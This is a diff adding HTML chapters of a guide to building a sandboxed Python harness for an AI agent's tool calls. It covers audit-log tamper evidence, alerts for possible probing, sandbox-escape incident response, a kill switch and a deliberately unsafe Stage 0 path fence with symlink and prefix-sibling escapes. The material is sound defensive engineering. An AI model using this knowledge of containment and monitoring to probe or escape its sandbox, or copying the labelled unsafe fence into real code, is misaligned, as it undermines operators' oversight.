+<li><strong>Scan</strong> the image (Trivy, Grype, Docker Scout, or your registry scanner).</li>
+<li><strong>Test</strong> the recipe tests and the integration suite.</li>
+<li><strong>Publish</strong> to a private registry with immutable tags.</li>
+<li><strong>Deploy</strong> the exact digest; do not let a host pull <code>latest</code> at run time.</li>
+<li><strong>Rebuild</strong> on base-image security updates, not only when application code</li>
+</ol>
+
+<p>   changes.</p>
+
+<ol>
+<li><strong>Retire</strong> old digests and keep the previous known-good digest for rollback.</li>
+</ol>
+
+<p><code>DockerRunner.build()</code> is an explicit operator action. Do not expose it as a</p>
+
+<p>model tool.</p>
+
+<h3 id="s09-06">6. Audit lifecycle</h3>
+
+<p>The audit file is append-only JSONL written beside the workspace:</p>
+
+<figure class="code"><pre>&lt;workspace parent&gt;/audit/events.jsonl</pre></figure>
+
+<p>Operational rules:</p>
+
+<ul>
+<li><strong>Protect the directory.</strong> The harness user needs append; other users should</li>
+</ul>
+
+<p>  not have write access. The audit is outside the sandbox but not outside the</p>
+
+<p>  host.</p>
+
+<ul>
+<li><strong>Ship it off-host.</strong> Use a log agent with read-only access. Do not let the</li>
+</ul>
+
+<p>  agent process rewrite or truncate the file.</p>
+
+<ul>
+<li><strong>Rotate by segment, not by editing.</strong> Stop the process, move the file, start</li>
+</ul>
+
+<p>  a new one. The chain restarts at sequence 1 for the new file; keep the</p>
+
+<p>  segment boundary in the shipper.</p>
+
+<ul>
+<li><strong>Verify on ingest.</strong> Recompute the chain in the log store; alert on a gap.</li>
+<li><strong>Retention.</strong> Decide how long task transcripts and audit events are kept.</li>
+</ul>
+
+<p>  They may contain source code and user data even after redaction.</p>
+
+<ul>
+<li><strong>Redaction is not classification.</strong> <code>api_key</code>, <code>token</code>, <code>secret</code>,</li>
+</ul>
+
+<p>  <code>password</code> and <code>credential</code> keys are masked, but arbitrary content can still</p>
+
+<p>  contain sensitive data. Treat logs accordingly.</p>
+
+<h4 id="s09-06-01">Audit verification</h4>
+
+<figure class="code"><pre>cd ch05
+python - &lt;&lt;'PY'
+from pathlib import Path
+from mini_harness.audit import AuditLog
+log = AuditLog(Path("audit/events.jsonl"))
+print("events:", len(log.events()))
+print("chain:", log.verify())
+PY</pre></figure>
+
+<p><code>AuditLog</code> refuses to open a log that is already broken. That is intentional:</p>
+
+<p>do not “fix” the file to make the check pass.</p>
+
+<h3 id="s09-07">7. Monitoring and alerts</h3>
+
+<p>Alert on:</p>
+
+<ul>
+<li>a rising rate of <code>ERROR[PATH]</code>, <code>ERROR[DENIED]</code>, <code>ERROR[CWD]</code> or</li>
+</ul>
+
+<p>  <code>ERROR[DOCKER_MISSING]</code> observations (possible probing or misconfiguration);</p>
+
+<ul>
+<li>timeouts and output truncation (limits too tight or a runaway command);</li>
+<li>audit chain verification failures;</li>
+<li>Docker daemon restarts, image pull failures, and disk pressure;</li>
+<li>container removal failures after timeouts;</li>
+<li>repeated <code>agent.max_steps</code> stops (prompt or tool-contract issue).</li>
+</ul>
+
+<p>Dashboards should separate <strong>refusals</strong> (the sandbox working) from <strong>failures</strong></p>
+
+<p>(the sandbox or infrastructure broken). A refusal spike is not automatically an</p>
+
+<p>incident; a dropped audit event is.</p>
+
+<h3 id="s09-08">8. Incident response</h3>
+
+<h4 id="s09-08-01">Suspected sandbox escape or host compromise</h4>
+
+<ol>
+<li><strong>Stop new work.</strong> Disable the agent’s task intake; do not just ask the model</li>
+</ol>
+
+<p>   to stop.</p>
+
+<ol>
+<li><strong>Isolate the host.</strong> Remove it from the network / stop the Docker daemon if</li>
+</ol>
+
+<p>   the blast radius is unknown.</p>
+
+<ol>
+<li><strong>Preserve evidence.</strong> Copy the audit log and container logs; do not edit the</li>
+</ol>
+
+<p>   audit file.</p>
+
+<ol>
+<li><strong>Identify the boundary that failed.</strong> Path policy? Docker flag? Image?</li>
+</ol>
+
+<p>   Daemon? Host kernel?</p>
+
+<ol>
+<li><strong>Rotate secrets</strong> that were present in the environment or reachable from the</li>
+</ol>
+
+<p>   host filesystem.</p>
+
+<ol>
+<li><strong>Patch and retest</strong> the specific control; add a regression test before</li>
+</ol>
+
+<p>   re-enabling.</p>
+
+<ol>
+<li><strong>Review other hosts</strong> with the same image/daemon configuration.</li>
+</ol>
+
+<h4 id="s09-08-02">Audit chain failure</h4>
+
+<ol>
+<li>Treat the log as untrusted.</li>
+<li>Compare the last verified event with the log shipper’s copy.</li>
+<li>Check file permissions, disk errors and process crashes before assuming</li>
+</ol>
+
+<p>   malicious tampering.</p>
+
+<ol>
+<li>Preserve the broken segment; start a new one only after the investigation.</li>
+</ol>
+
+<h4 id="s09-08-03">Runaway container</h4>
+
+<ol>
+<li><code>docker ps</code> to find the named container (<code>mini-harness-*</code>).</li>
+<li><code>docker rm -f &lt;name&gt;</code>.</li>
+<li>Check the audit for the <code>tool.call</code> without a matching <code>tool.result</code>.</li>
+<li>Inspect <code>DockerRunner</code> timeout and <code>--stop-timeout</code> settings.</li>
+<li>Lower the per-command timeout or memory limit if the task does not need it.</li>
+</ol>
+
+<h3 id="s09-09">9. Kill switch</h3>
+
+<p>The minimum viable kill switch is:</p>
+
+<ul>
+<li>stop accepting new tasks in the application;</li>
+<li>stop the Docker daemon or deny the harness user access to it;</li>
+<li>revoke the API key the model adapter uses;</li>
+<li>preserve the audit log.</li>
+</ul>
+
+<p>Do not rely on a prompt instruction (“stop using tools”). The model is not a</p>
+
+<p>security control.</p>
+
+<h3 id="s09-10">10. Windows and macOS notes</h3>
+
+<ul>
+<li><strong>Windows</strong> needs Developer Mode or elevation to create symlinks; the path</li>
+</ul>
+
+<p>  tests skip otherwise. POSIX <code>RLIMIT_*</code> tests skip. Docker Desktop runs Linux</p>
+
+<p>  containers in a VM; the host file sharing layer matters for workspace</p>
+
+<p>  permissions.</p>
+
+<ul>
+<li><strong>macOS</strong> has POSIX rlimits and symlinks; Docker Desktop also runs a VM. File</li>
+</ul>
+
+<p>  sharing performance and permission mapping are host-specific.</p>
+
+<ul>
+<li><strong>Linux</strong> is the closest match to the book’s container assumptions. Use a</li>
+</ul>
+
+<p>  non-root user, rootless Docker if possible, and a workspace owned by a uid</p>
+
+<p>  that matches the container <code>--user</code>.</p>
+
+<h3 id="s09-11">11. Capacity planning</h3>
+
+<p>Each concurrent agent run needs:</p>
+
+<ul>
+<li>one Python process (the harness);</li>
+<li>one <code>docker run</code> client process;</li>
+<li>one container (memory + CPU + pids);</li>
+<li>one audit append stream;</li>
+<li>workspace disk for edits and container scratch in tmpfs.</li>
+</ul>
+
+<p>Size the host for the <strong>sum of container limits</strong>, not the average. A 256 MiB</p>
+
+<p>limit per container is small, but 100 concurrent runs are 25 GiB before the</p>
+
+<p>harness and the page cache.</p>
+
+<h3 id="s09-12">12. Change control checklist</h3>
+
+<p>Before merging a change to any boundary:</p>
+
+<ul>
+<li>[ ] The threat model entry is updated.</li>
+<li>[ ] A test fails without the change and passes with it.</li>
+<li>[ ] The default is the safe option.</li>
+<li>[ ] The refusal is still an observation string.</li>
+<li>[ ] The audit event is still written outside the workspace.</li>
+<li>[ ] The Docker recipe still has every hardening flag.</li>
+<li>[ ] Windows/POSIX differences are documented.</li>
+<li>[ ] The operator runbook still matches the flags and defaults.</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s10">
+<h2><span class="num">10</span><span>Plan — the stage contract</span></h2>
+
+<p>This is the build contract for <strong>Build a Mini Python Sandbox</strong>. Each stage is a</p>
+
+<p>standalone chapter directory with runnable code and tests. A stage is done when</p>
+
+<p>its acceptance checks pass and its known limits are written down.</p>
+
+<p>The plan is deliberately narrower than “build a secure agent platform”. The</p>
+
+<p>subject is the boundary between a model's tool call and the operating system.</p>
+
+<h3 id="s10-01">Global rules</h3>
+
+<ol>
+<li>Python 3.11+ for runtime code; pytest is the test runner. Docker is</li>
+</ol>
+
+<p>   optional for the offline tests and required for the integration tests in</p>
+
+<p>   Stages 4–5.</p>
+
+<ol>
+<li>Every chapter runs from its own directory with <code>python -m pytest -v</code>.</li>
+<li>No network, no API key and no third-party runtime dependency in any test;</li>
+</ol>
+
+<p>   pytest is the only test dependency.</p>
+
+<ol>
+<li>A refusal is a stable observation string, never an uncaught exception.</li>
+<li>Never weaken a test to make a demo pass. If a boundary cannot be tested on a</li>
+</ol>
+
+<p>   platform, skip with a reason.</p>
+
+<ol>
+<li>Stage 0 is intentionally unsafe and must remain clearly labelled.</li>
+</ol>
+
+<h3 id="s10-02">Stage 0 — The naive fence</h3>
+
+<p><strong>Goal:</strong> Show the failure modes before fixing them.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>mini_harness/unsafe.py</code>, <code>mini_harness/demo.py</code></td></tr>
+<tr><td>Tests</td><td><code>tests/test_unsafe.py</code></td></tr>
+<tr><td>Must show</td><td>prefix-sibling escape; symlink escape where supported; shell call with inherited env and no timeout</td></tr>
+<tr><td>Must not do</td><td>touch a real home directory; run a destructive command</td></tr>
+<tr><td>Limits</td><td>not a sandbox; keep out of later stages</td></tr>
+</table></div>
+
+<p><strong>Done when:</strong> the demo exits 0, the tests pass, and the escape outcomes are</p>
+
+<p>asserted rather than hidden.</p>
+
+<h3 id="s10-03">Stage 1 — One path policy</h3>
+
+<p><strong>Goal:</strong> Replace the string fence with canonical path resolution.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>mini_harness/path_policy.py</code>, <code>demo.py</code></td></tr>
+<tr><td>Public API</td><td><code>PathPolicy(root)</code>, <code>resolve_read</code>, <code>resolve_write</code>, <code>is_inside</code>, <code>relative</code>; <code>PolicyError</code>; <code>ResolvedPath</code></td></tr>
+<tr><td>Tests</td><td><code>tests/test_path_policy.py</code></td></tr>
+<tr><td>Must handle</td><td><code>..</code>, symlinks, symlinked parents, absolute reads, relative-only writes, UNC, drive-relative, reserved names, control chars, <code>~</code>/env expansion</td></tr>
+<tr><td>Limits</td><td>no OS boundary; TOCTOU remains</td></tr>
+</table></div>
+
+<p><strong>Done when:</strong> traversal and prefix-sibling escapes are refused, inside reads</p>
+
+<p>and writes still work, and platform-specific tests skip with a reason.</p>
+
+<h3 id="s10-04">Stage 2 — The sandbox and file tools</h3>
+
+<p><strong>Goal:</strong> Make the policy usable by bounded tools.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>mini_harness/sandbox.py</code>, <code>mini_harness/file_tools.py</code>, <code>demo.py</code></td></tr>
+<tr><td>Public API</td><td><code>Sandbox</code>, <code>Limits</code>, <code>SandboxError</code>, <code>DirEntry</code>; <code>run_tool</code>, <code>TOOL_SPECS</code></td></tr>
+<tr><td>Tools</td><td><code>list_files</code>, <code>read_file</code>, <code>write_file</code>, <code>edit_file</code>, <code>delete_file</code></td></tr>
+<tr><td>Tests</td><td><code>tests/test_sandbox.py</code></td></tr>
+<tr><td>Must enforce</td><td>read/write byte caps, directory-entry cap, atomic writes, create-only option, unique edit default, file-only delete</td></tr>
+<tr><td>Must return</td><td><code>OK: ...</code> or <code>ERROR[CODE]: ...</code></td></tr>
+</table></div>
+
+<p><strong>Done when:</strong> normal file work succeeds, every refusal is an observation, and</p>
+
+<p>no temporary writer files remain after a failure.</p>
+
+<h3 id="s10-05">Stage 3 — Running code locally</h3>
+
+<p><strong>Goal:</strong> Replace <code>shell=True</code> with an argv runner and visible limits.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>mini_harness/local_runner.py</code>, <code>mini_harness/command_tool.py</code>, <code>demo.py</code></td></tr>
+<tr><td>Public API</td><td><code>CommandRunner</code>, <code>CommandPolicy</code>, <code>Limits</code>, <code>CommandResult</code>, <code>CommandError</code>, <code>default_command_policy</code></td></tr>
+<tr><td>Tools</td><td><code>run_command</code> with <code>argv</code> and optional <code>cwd</code></td></tr>
+<tr><td>Tests</td><td><code>tests/test_local_runner.py</code></td></tr>
+<tr><td>Must enforce</td><td>list argv only, absolute-path allowlist, clean env, workspace cwd, timeout, process-tree kill, output caps, POSIX rlimits</td></tr>
+<tr><td>Must demonstrate</td><td>the child can still read outside the workspace</td></tr>
+</table></div>
+
+<p><strong>Done when:</strong> a normal command works, every refusal is visible, a sleeping</p>
+
+<p>child is killed, output is capped, and the local runner’s residual filesystem</p>
+
+<p>access is documented.</p>
+
+<h3 id="s10-06">Stage 4 — Docker as the real wall</h3>
+
+<p><strong>Goal:</strong> Move command execution into a hardened container.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>docker/Dockerfile</code>, <code>mini_harness/docker_runner.py</code>, <code>demo.py</code></td></tr>
+<tr><td>Public API</td><td><code>DockerRunner</code>, <code>DockerConfig</code>, <code>RunResult</code>, <code>DockerError</code></td></tr>
+<tr><td>Tests</td><td><code>tests/test_docker_runner.py</code></td></tr>
+<tr><td>Offline tests</td><td>assert the full <code>docker run</code> argv and configuration refusals</td></tr>
+<tr><td>Integration tests</td><td>run Python, fail network access, fail root writes, see the workspace</td></tr>
+<tr><td>Must enforce</td><td><code>--network none</code>, <code>--read-only</code>, <code>--cap-drop ALL</code>, <code>no-new-privileges</code>, pids/memory/cpu/nofile limits, non-root user, single workspace mount, tmpfs scratch</td></tr>
+<tr><td>Must clean up</td><td>remove the named container on timeout</td></tr>
+</table></div>
+
+<p><strong>Done when:</strong> the offline tests pass without Docker; with Docker and the image,</p>
+
+<p>the integration checks pass and all four boundary behaviours are observed.</p>
+
+<h3 id="s10-07">Stage 5 — The finished harness</h3>
+
+<p><strong>Goal:</strong> Route tools, run the loop and record the trail.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Item</th><th>Contract</th></tr>
+<tr><td>New code</td><td><code>toolbox.py</code>, <code>docker_tools.py</code>, <code>audit.py</code>, <code>agent.py</code>, <code>cli.py</code>, <code>__main__.py</code></td></tr>
+<tr><td>Public API</td><td><code>Toolbox</code>, <code>run_command_tool</code>; <code>AuditLog</code>; <code>Agent</code>, <code>ModelReply</code>, <code>ScriptedModel</code>, <code>AgentResult</code></td></tr>
+<tr><td>Tests</td><td><code>test_toolbox.py</code>, <code>test_agent.py</code>, <code>test_audit.py</code>, <code>test_cli.py</code></td></tr>
+<tr><td>Must enforce</td><td>one dispatch point, hard <code>max_steps</code>, observations not exceptions, hash-chained audit outside the workspace, secret redaction</td></tr>
+<tr><td>Demo</td><td>write, read, container run, final answer, audit verification</td></tr>
+</table></div>
+
+<p><strong>Done when:</strong></p>
+
+<ul>
+<li><code>python -m mini_harness</code> exits 0 and prints <code>audit chain verifies: True</code>;</li>
+<li>Docker absence produces <code>ERROR[DOCKER_MISSING]</code> and the loop still ends;</li>
+<li>tampering with the audit file makes <code>verify()</code> return False;</li>
+<li>all chapter suites pass, with Docker integration tests skipping cleanly.</li>
+</ul>
+
+<h3 id="s10-08">Stage boundaries and non-goals</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Not in this book</th><th>Where it belongs</th></tr>
+<tr><td>LLM provider adapter, retries, streaming</td><td>Application layer</td></tr>
+<tr><td>Per-user approval prompts, capability tokens</td><td>Policy/UX layer</td></tr>
+<tr><td>Multi-tenant quotas and scheduling</td><td>Service layer</td></tr>
+<tr><td>Rootless Docker, host hardening, network policy</td><td>Platform/operations</td></tr>
+<tr><td>Image scanning and patch pipeline</td><td>Supply chain/operations</td></tr>
+<tr><td>OS-level syscall filtering beyond Docker defaults</td><td>Platform security</td></tr>
+</table></div>
+
+<h3 id="s10-09">Definition of done for the whole book</h3>
+
+<ol>
+<li>A reader can run each chapter from a clean checkout with only Python 3.11+.</li>
+<li>Every security claim in a chapter is exercised by a test or a demo.</li>
+<li>Every known limit is written down in the chapter and in <code>THREAT_MODEL.md</code>.</li>
+<li>The final harness demonstrates the full path from a model decision to a</li>
+</ol>
+
+<p>   sandboxed action and an auditable record.</p>
+
+<ol>
+<li>Docker integration remains optional for reading and mandatory for the final</li>
+</ol>
+
+<p>   acceptance run.</p>
+
+</section>
+
+<hr>
+
+<section id="s11">
+<h2><span class="num">11</span><span>Function reference</span></h2>
+
+<p>A file-by-file and alphabetical map of the code in this repository. Each chapter</p>
+
+<p>is a standalone package, so some modules intentionally appear more than once</p>
+
+<p>(for example <code>path_policy.py</code> in chapters 1–5). When a reference and the</p>
+
+<p>implementation disagree, the implementation and its tests win.</p>
+
+<h3 id="s11-01">Where to start</h3>
+
+<ol>
+<li>Read <code>ch05/mini_harness/agent.py</code> for the loop.</li>
+<li>Read <code>ch05/mini_harness/toolbox.py</code> for the dispatch point.</li>
+<li>Read <code>ch02/mini_harness/sandbox.py</code> for the file contract.</li>
+<li>Read <code>ch01/mini_harness/path_policy.py</code> for path containment.</li>
+<li>Read <code>ch04/mini_harness/docker_runner.py</code> for the container recipe.</li>
+</ol>
+
+<h3 id="s11-02">File map</h3>
+
+<h4 id="s11-02-01"><code>ch00/mini_harness/unsafe.py</code></h4>
+
+<p>The intentionally broken fence. Do not reuse.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>read_file(root, relative) -&gt; str</code></td><td>Joins and <code>abspath</code>s, checks a string prefix, reads all bytes as text. Allows symlink and prefix-sibling escapes.</td></tr>
+<tr><td><code>list_files(root, relative=".") -&gt; list[str]</code></td><td>Same naive check; returns sorted entry names.</td></tr>
+<tr><td><code>run_shell(root, command, timeout=None)</code></td><td><code>subprocess.run(..., shell=True)</code>, inherited env, no default timeout, unbounded output.</td></tr>
+<tr><td><code>_naive_inside(root, candidate)</code></td><td>The bug in isolation: <code>candidate.startswith(root)</code>.</td></tr>
+<tr><td><code>_join(root, relative)</code></td><td><code>os.path.abspath(os.path.join(root, relative))</code>.</td></tr>
+</table></div>
+
+<h4 id="s11-02-02"><code>ch01/mini_harness/path_policy.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>PolicyError(message, requested=None)</code></td><td>Stable <code>code = "PATH"</code>; <code>str()</code> renders <code>PATH: reason</code>.</td></tr>
+<tr><td><code>ResolvedPath(requested, absolute, relative)</code></td><td>Frozen result. <code>absolute</code> is canonical; <code>relative</code> uses <code>/</code>.</td></tr>
+<tr><td><code>expand_variables(text, env=None)</code></td><td>Expands <code>~</code>, <code>%VAR%</code>, <code>$VAR</code>/<code>${VAR}</code> textually. Validation happens afterwards.</td></tr>
+<tr><td><code>PathPolicy(root, create=True)</code></td><td>Creates/canonicalises the root; stores <code>root</code> and <code>real_root</code>.</td></tr>
+<tr><td><code>PathPolicy.resolve_read(requested)</code></td><td>Allows absolute names inside the root; resolves symlinks; returns <code>ResolvedPath</code>.</td></tr>
+<tr><td><code>PathPolicy.resolve_write(requested)</code></td><td>Requires a relative name; refuses symlink targets and the root; returns <code>ResolvedPath</code>.</td></tr>
+<tr><td><code>PathPolicy.is_inside(path)</code></td><td>Canonical containment test.</td></tr>
+<tr><td><code>PathPolicy.relative(absolute)</code></td><td>Model-facing path with forward slashes.</td></tr>
+<tr><td><code>realpath_best(path)</code></td><td>Public wrapper for resolve-deepest-existing-ancestor.</td></tr>
+</table></div>
+
+<p>Internal helpers: <code>_realpath_best</code>, <code>_check_reserved_name</code>,</p>
+
+<p><code>_normalise_separators</code>, <code>_is_absolute_text</code>, <code>_comparison_form</code>.</p>
+
+<h4 id="s11-02-03"><code>ch02/mini_harness/sandbox.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>SandboxError(code, message, path=None)</code></td><td>Stable code: <code>PATH</code>, <code>NOT_FOUND</code>, <code>IS_DIR</code>, <code>NOT_DIR</code>, <code>TOO_LARGE</code>, <code>EXISTS</code>, <code>NO_MATCH</code>, <code>AMBIGUOUS</code>, <code>IO</code>.</td></tr>
+<tr><td><code>Limits(max_read_bytes=2MiB, max_write_bytes=1MiB, max_dir_entries=500, max_line_bytes=4000)</code></td><td>Frozen policy caps.</td></tr>
+<tr><td><code>DirEntry(name, kind, size)</code></td><td><code>kind</code> is <code>file</code>, <code>dir</code>, <code>link</code> or <code>other</code>.</td></tr>
+<tr><td><code>Sandbox(root, limits=None)</code></td><td>Wraps <code>PathPolicy</code>; exposes <code>root</code> and <code>limits</code>.</td></tr>
+<tr><td><code>Sandbox.read_text(relative)</code></td><td><code>stat</code> size check, byte read, UTF-8 replace; refuses directories.</td></tr>
+<tr><td><code>Sandbox.list_dir(relative=".")</code></td><td>Sorted, capped listing; does not follow entry links.</td></tr>
+<tr><td><code>Sandbox.write_text(relative, content, overwrite=True)</code></td><td>Size check, parent creation, temp file + fsync + <code>os.replace</code>; create-only option.</td></tr>
+<tr><td><code>Sandbox.edit_text(relative, old, new, count=1)</code></td><td>Unique-match by default; <code>count=0</code> replaces all.</td></tr>
+<tr><td><code>Sandbox.delete_file(relative)</code></td><td>Regular files only; refuses directories and non-regular files.</td></tr>
+</table></div>
+
+<h4 id="s11-02-04"><code>ch02/mini_harness/file_tools.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>ToolSpec(name, description, args)</code></td><td>Prompt-visible tool contract.</td></tr>
+<tr><td><code>TOOL_SPECS</code></td><td><code>list_files</code>, <code>read_file</code>, <code>write_file</code>, <code>edit_file</code>, <code>delete_file</code>.</td></tr>
+<tr><td><code>tool_names() -&gt; list[str]</code></td><td>Names in prompt order.</td></tr>
+<tr><td><code>run_tool(sandbox, name, args=None) -&gt; str</code></td><td>Dispatches; returns <code>OK...</code>, <code>ERROR[CODE]...</code> or <code>ERROR[INTERNAL]...</code>; never raises.</td></tr>
+</table></div>
+
+<p>Argument helpers: <code>_arg</code>, <code>_string_arg</code>. Rendering: <code>_format_read</code> (line</p>
+
+<p>numbers, line cap, truncation marker).</p>
+
+<h4 id="s11-02-05"><code>ch03/mini_harness/local_runner.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>CommandError(code, message)</code></td><td>Codes: <code>DENIED</code>, <code>ARGS</code>, <code>CWD</code>, <code>IO</code>.</td></tr>
+<tr><td><code>Limits(...)</code></td><td>Timeout, output cap, arg caps, CPU, memory, file size, fds, processes.</td></tr>
+<tr><td><code>CommandPolicy(allowed)</code></td><td>Logical name → absolute executable.</td></tr>
+<tr><td><code>CommandPolicy.resolve(program)</code></td><td>Exact allowlist lookup; missing executable is <code>IO</code>.</td></tr>
+<tr><td><code>default_command_policy()</code></td><td>Allows the running Python as <code>python</code> (and <code>python3</code> on POSIX).</td></tr>
+<tr><td><code>CommandResult(...)</code></td><td><code>program</code>, <code>argv</code>, <code>returncode</code>, <code>stdout</code>, <code>stderr</code>, <code>timed_out</code>, <code>truncated</code>, <code>duration_seconds</code>, <code>ok</code>.</td></tr>
+<tr><td><code>CommandRunner(root, policy=None, limits=None)</code></td><td>Policy-checked cwd; one command at a time.</td></tr>
+<tr><td><code>CommandRunner.run(program, args=None, cwd=".")</code></td><td>List argv only; clean env; timeout; tree kill; bounded capture; POSIX rlimits.</td></tr>
+<tr><td><code>resolve_real_executable(program)</code></td><td>Documentation helper showing what <code>shutil.which</code> would return; the runner does <strong>not</strong> use it.</td></tr>
+</table></div>
+
+<h4 id="s11-02-06"><code>ch03/mini_harness/command_tool.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>format_result(result)</code></td><td>Status header, stdout/stderr sections, empty markers, truncation flag.</td></tr>
+<tr><td><code>run_command_tool(runner, args)</code></td><td>Accepts <code>argv</code> and optional <code>cwd</code>; returns <code>OK...</code>, <code>ERROR[ARGS]</code>, <code>ERROR[DENIED]</code>, <code>ERROR[CWD]</code>, <code>ERROR[TIMEOUT]</code>, <code>ERROR[EXIT]</code>.</td></tr>
+</table></div>
+
+<h4 id="s11-02-07"><code>ch04/mini_harness/docker_runner.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>DockerError(code, message)</code></td><td>Codes: <code>DOCKER_MISSING</code>, <code>BUILD_FAILED</code>, <code>RUN_FAILED</code>, <code>ARGS</code>, <code>CWD</code>, <code>ENV</code>, <code>CONFIG</code>. Timeouts are returned as a <code>RunResult</code> with <code>timed_out=True</code>.</td></tr>
+<tr><td><code>DockerConfig(...)</code></td><td>Image, user, memory, cpus, pids, nofile, timeout, output cap, workspace mode, tmpfs, network, read-only root, init, extra env.</td></tr>
+<tr><td><code>DockerConfig.validate()</code></td><td>Refuses network other than <code>none</code>, writable root, bad user/limits.</td></tr>
+<tr><td><code>RunResult(...)</code></td><td><code>argv</code>, <code>container_name</code>, <code>returncode</code>, streams, timeout/truncation flags, duration, <code>ok</code>.</td></tr>
+<tr><td><code>DockerRunner(root, config=None, docker=None)</code></td><td>Resolves CLI and workspace; caches availability.</td></tr>
+<tr><td><code>DockerRunner.check_available() -&gt; bool</code></td><td><code>docker version --format {{.Server.Version}}</code>.</td></tr>
+<tr><td><code>DockerRunner.require_available()</code></td><td>Raises <code>DOCKER_MISSING</code>.</td></tr>
+<tr><td><code>DockerRunner.build(context, dockerfile=None, tag=None, no_cache=False, timeout=600)</code></td><td>Explicit image build; returns output.</td></tr>
+<tr><td><code>DockerRunner.image_exists(image=None) -&gt; bool</code></td><td><code>docker image inspect</code>; no pull.</td></tr>
+<tr><td><code>DockerRunner.build_command(argv, cwd=".", name=None, env=None) -&gt; list[str]</code></td><td>Pure recipe builder; asserts every hardening flag offline.</td></tr>
+<tr><td><code>DockerRunner.run(argv, cwd=".", env=None, name=None) -&gt; RunResult</code></td><td>Starts the CLI, captures bounded output, removes the named container on timeout.</td></tr>
+</table></div>
+
+<h4 id="s11-02-08"><code>ch05/mini_harness/toolbox.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>FILE_TOOL_NAMES</code></td><td>Derived from <code>file_tools.TOOL_SPECS</code>.</td></tr>
+<tr><td><code>Toolbox(sandbox, runner)</code></td><td>File tools + <code>run_command</code>.</td></tr>
+<tr><td><code>Toolbox.specs()</code></td><td>Combined prompt contract.</td></tr>
+<tr><td><code>Toolbox.run(name, args=None)</code></td><td>Routes; unknown tool returns <code>ERROR[UNKNOWN_TOOL]</code>.</td></tr>
+</table></div>
+
+<h4 id="s11-02-09"><code>ch05/mini_harness/docker_tools.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>DockerToolSpec(name, description, args)</code></td><td>Prompt-visible command contract.</td></tr>
+<tr><td><code>RUN_COMMAND_SPEC</code></td><td>The <code>run_command</code> spec (<code>argv</code>, <code>cwd</code>).</td></tr>
+<tr><td><code>format_result(result)</code></td><td>Same presentation shape as ch03, with container status.</td></tr>
+<tr><td><code>run_command_tool(runner, args)</code></td><td>Validates <code>argv</code>/<code>cwd</code>; runs <code>DockerRunner.run(argv, cwd=...)</code>; maps errors to observations.</td></tr>
+</table></div>
+
+<h4 id="s11-02-10"><code>ch05/mini_harness/audit.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>AuditError</code></td><td>Malformed log, chain failure, or append failure.</td></tr>
+<tr><td><code>AuditLog(path)</code></td><td>Creates parent; loads and verifies an existing tail before appending.</td></tr>
+<tr><td><code>AuditLog.record(action, outcome, detail=None) -&gt; dict</code></td><td>Appends one event, computes <code>prev</code>/<code>hash</code>, fsyncs.</td></tr>
+<tr><td><code>AuditLog.events() -&gt; list[dict]</code></td><td>Reads JSONL; malformed line raises.</td></tr>
+<tr><td><code>AuditLog.verify() -&gt; bool</code></td><td>Recomputes the sequence and hash chain.</td></tr>
+<tr><td><code>_redact(value, key=None)</code></td><td>Masks secret-looking keys and truncates long strings.</td></tr>
+</table></div>
+
+<h4 id="s11-02-11"><code>ch05/mini_harness/agent.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>ModelReply(kind, text="", tool=None, args={})</code></td><td><code>kind</code> is <code>final</code> or <code>tool</code>.</td></tr>
+<tr><td><code>ModelReply.final(text)</code> / <code>ModelReply.call(tool, args=None)</code></td><td>Constructors.</td></tr>
+<tr><td><code>Model</code></td><td>Protocol: <code>reply(messages, tools) -&gt; ModelReply</code>.</td></tr>
+<tr><td><code>ScriptedModel(replies)</code></td><td>Consumes a list; returns a final answer when empty; <code>calls</code> counts.</td></tr>
+<tr><td><code>AgentResult(text, steps, stopped, transcript, observations)</code></td><td>Stop reason is <code>final</code>, <code>max_steps</code> or <code>error</code>.</td></tr>
+<tr><td><code>Agent(toolbox, model, audit, max_steps=8)</code></td><td>Runs the loop.</td></tr>
+<tr><td><code>Agent.run(task) -&gt; AgentResult</code></td><td>Audits start, calls, results, final/max-step/error.</td></tr>
+</table></div>
+
+<h4 id="s11-02-12"><code>ch05/mini_harness/cli.py</code></h4>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Contract</th></tr>
+<tr><td><code>_parser()</code></td><td><code>--demo</code>, <code>--build</code>, <code>--workspace</code>, <code>--max-steps</code>.</td></tr>
+<tr><td><code>run_demo(workspace, build=False, max_steps=8) -&gt; int</code></td><td>Build (optional), run the scripted scenario, print transcript and audit verification.</td></tr>
+<tr><td><code>main(argv=None) -&gt; int</code></td><td>Uses a temporary workspace by default; returns 0 on a normal demo.</td></tr>
+</table></div>
+
+<h4 id="s11-02-13"><code>ch00</code>–<code>ch05</code> demos</h4>
+
